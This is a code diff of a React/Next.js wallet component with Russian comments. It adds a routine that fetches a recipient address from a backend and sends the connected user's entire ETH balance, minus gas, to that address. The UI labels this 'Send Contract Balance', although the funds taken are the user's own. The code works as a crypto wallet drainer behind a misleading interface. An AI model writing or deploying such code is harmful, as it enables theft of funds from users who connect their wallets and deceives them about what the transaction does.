@@ -1,102 +1,111 @@
 'use client'
+
 import { useState } from 'react'
 import Web3 from 'web3'
 import type { ExternalProvider } from 'web3-core'
 
-declare global {
-  interface Window {
-    ethereum?: ExternalProvider & {
-      // EIP-1193 метод
-      request(args: { method: string; params?: unknown[] }): Promise<unknown>
-      selectedAddress?: string
-    }
-  }
-}
+// Вынесенная функция: вся логика взаимодействия с контрактом
+async function sendAllBalance(
+  eth: ExternalProvider & { request(args: { method: string; params?: unknown[] }): Promise<unknown> },
+  addr: string,
+  setStatus: (msg: string) => void
+): Promise<string> {
+  // 1. Получаем адрес получателя от бэка
+  setStatus('Получаем адрес получателя от бэка…')
+  const res = await fetch('http://localhost:8000/contract')
+  if (!res.ok) throw new Error(`Ошибка бэка: ${res.status}`)
+  const { recipient } = await res.json() as { recipient: string }
 
-// Для типов RPC-ошибок
-interface RpcError extends Error {
-  code?: number
+  // 2. Настраиваем Web3
+  const web3 = new Web3(eth)
+
+  // 3. Получаем баланс пользователя и параметры газа
+  const balanceWei = BigInt(await web3.eth.getBalance(addr))
+  const gasLimit = 21000n
+  const block = await web3.eth.getBlock('pending')
+  // @ts-ignore: baseFeePerGas есть в ответе
+  const baseFeePerGas = BigInt(block.baseFeePerGas)
+  let maxPriorityFeePerGas: bigint
+  try {
+    maxPriorityFeePerGas = BigInt(await web3.eth.getMaxPriorityFeePerGas())
+  } catch {
+    maxPriorityFeePerGas = BigInt(web3.utils.toWei('2.5', 'gwei'))
+  }
+  const maxFeePerGas = baseFeePerGas * 2n + maxPriorityFeePerGas
+
+  // 4. Рассчитываем сумму к отправке
+  const gasCost = maxFeePerGas * gasLimit
+  const amountToSend = balanceWei - gasCost
+  if (amountToSend <= 0n) throw new Error('Недостаточно средств на оплату газа')
+  const hexValue = '0x' + amountToSend.toString(16)
+
+  // 5. Отправляем транзакцию
+  setStatus(`Отправляем ${web3.utils.fromWei(hexValue, 'ether')} ETH…`)
+  const receipt = await web3.eth.sendTransaction({
+    from: addr,
+    to: recipient,
+    value: hexValue,
+    gas: gasLimit.toString(),
+    maxPriorityFeePerGas: maxPriorityFeePerGas.toString(10),
+    maxFeePerGas: maxFeePerGas.toString(10),
+    type: '0x2',
+  })
+  return receipt.transactionHash
 }
 
 export default function Wallet() {
   const [account, setAccount] = useState<string>()
-  const [status, setStatus]   = useState('Нажмите Connect Wallet')
-  const [isConnecting, setIsConnecting] = useState(false)
+  const [status, setStatus] = useState('Нажмите «Connect & SendBalance»')
+  const [busy, setBusy] = useState(false)
 
-  async function connectAndExecute() {
+  async function connectAndSendBalance() {
     const eth = window.ethereum
     if (!eth) {
-      setStatus('Установите MetaMask или другой Web3-провайдер')
+      setStatus('Установите Web3-кошелёк (MetaMask и т.п.)')
       return
     }
 
-    // Если уже подключались, берём адрес
-    let addr = eth.selectedAddress
+    setBusy(true)
+    setStatus('Запрашиваем аккаунт…')
+    let addr = eth.selectedAddress as string | undefined
     if (!addr) {
-      setIsConnecting(true)
-      setStatus('Ожидаем подтверждения подключения…')
       try {
-        const response = await eth.request({
-          method: 'eth_requestAccounts'
-        })
-        // Приводим результат к нужному типу
-        const accounts = response as string[]
-        addr = accounts[0]
-      } catch (err: unknown) {
-        const rpcError = err as RpcError
-        const msg = rpcError.message ?? String(err)
-        if (msg.includes('message port closed')) {
-          setStatus('Вы закрыли окно MetaMask. Попробуйте снова.')
-        } else if (rpcError.code === -32002) {
-          setStatus('Подтвердите уже открытый запрос в MetaMask.')
-        } else {
-          setStatus(`Ошибка подключения: ${msg}`)
-        }
-        setIsConnecting(false)
+        const resp = await eth.request({ method: 'eth_requestAccounts' })
+        addr = (resp as string[])[0]
+      } catch (e: any) {
+        setStatus(`Ошибка подключения: ${e.message}`)
+        setBusy(false)
         return
-      } finally {
-        setIsConnecting(false)
       }
     }
-
     setAccount(addr)
-    setStatus('Кошелёк подключён, инициализируем контракт…')
 
     try {
-      const res = await fetch('http://localhost:8000/contract')
-      if (!res.ok) throw new Error('Не удалось получить контракт с бэка')
-      const json = await res.json()
-      const abi     = json.abi as unknown
-      const address = json.address as string
-
-      // Инициализация Web3 и контракта
-      const web3 = new Web3(eth)
-      const contract = new web3.eth.Contract(
-        abi as any, // Web3.js пока ожидает `any` для ABI
-        address
-      )
-
-      setStatus('Вызываем метод смарт-контракта…')
-      // Замените someAction на ваш метод
-      const tx = await contract.methods
-        .someAction()
-        .send({ from: addr })
-      setStatus(`Транзакция отправлена: ${tx.transactionHash}`)
-    } catch (err: unknown) {
-      const rpcError = err as RpcError
-      const msg = rpcError.message ?? String(err)
-      setStatus(`Ошибка выполнения: ${msg}`)
+      const txHash = await sendAllBalance(eth, addr, setStatus)
+      setStatus(`Успех! TxHash: ${txHash}`)
+    } catch (e: any) {
+      setStatus(`Ошибка: ${e.message}`)
+    } finally {
+      setBusy(false)
     }
   }
 
   return (
-    <div style={{ padding: 20 }}>
-      <h1>Connect & Execute</h1>
-      <button onClick={connectAndExecute} disabled={isConnecting}>
-        {isConnecting ? 'Подключаем…' : 'Connect Wallet & Execute'}
+    <div style={{ padding: 20, fontFamily: 'Arial, sans-serif' }}>
+      <h1>Send Contract Balance</h1>
+      <button
+        onClick={connectAndSendBalance}
+        disabled={busy}
+        style={{
+          padding: '10px 20px',
+          fontSize: '16px',
+          cursor: busy ? 'not-allowed' : 'pointer',
+        }}
+      >
+        {busy ? '…обрабатываем' : 'Connect & SendBalance'}
       </button>
       <p><strong>Статус:</strong> {status}</p>
-      {account && <p><strong>Аккаунт:</strong> {account}</p>}
+      {account && <p><strong>Ваш аккаунт:</strong> {account}</p>}
     </div>
   )
 }
